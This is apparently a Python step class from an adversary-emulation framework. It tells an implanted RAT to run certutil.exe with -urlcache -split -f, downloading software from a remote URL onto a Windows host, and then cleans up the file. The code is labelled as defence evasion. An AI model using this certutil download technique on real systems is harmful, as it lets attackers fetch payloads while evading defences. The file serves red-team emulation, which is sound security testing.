from plugins.adversary.app.operation.operation import Step, OPSoftware, OPRat, OPVar, OPHost, OPFile
from plugins.adversary.app.commands import *
from plugins.adversary.app.custom import *


class CertutilDownload(Step):
    """    Description:
            This step downloads a file from a remote web server to the host using certutil.
            Based on https://twitter.com/subTee/status/888102593838362624
           Requirements:
            This step only requires the existence of a RAT on a host in order to run.
    """
    display_name = 'certutil_download'
    summary = 'Let certutil.exe download a file from a remote server'
    attack_mapping = [('T1140', 'Defense Evasion')]
    preconditions = [('rat', OPRat), ('host', OPHost(OPVar('rat.host'))), ('software', OPSoftware({'downloaded': False}))]
    postconditions = [('file_g', OPFile), ('software_g', OPSoftware({'downloaded': True}))]
    postproperties = ['file_g.path']
    significant_parameters = ['host']

    @staticmethod
    def description(host, software):
        return 'Downloading {} via Certutil on {}'.format(software.name, host.fqdn)

    @staticmethod
    def parser(text):
        return (re.search('completed successfully', text) is not None)

    @staticmethod
    async def action(operation, rat, host, software, file_g, software_g):
        filename = get_process(software.download_url)
        commands = 'c:\\windows\\system32\\certutil.exe -urlcache -split -f {} && move {} {}'.format(software.download_url, filename, software.download_loc)
        successful = (await operation.execute_shell_command(rat, command.CommandLine(['cmd', '/c', '"{}"'.format(commands)]), CertutilDownload.parser))
        await file_g({'path': software.download_loc, 'host': host })
        software.downloaded = True
        await update_software(software_g, software)
        return successful

    @staticmethod
    async def cleanup(cleaner, file_g):
        for file in file_g:
            await cleaner.delete(file)
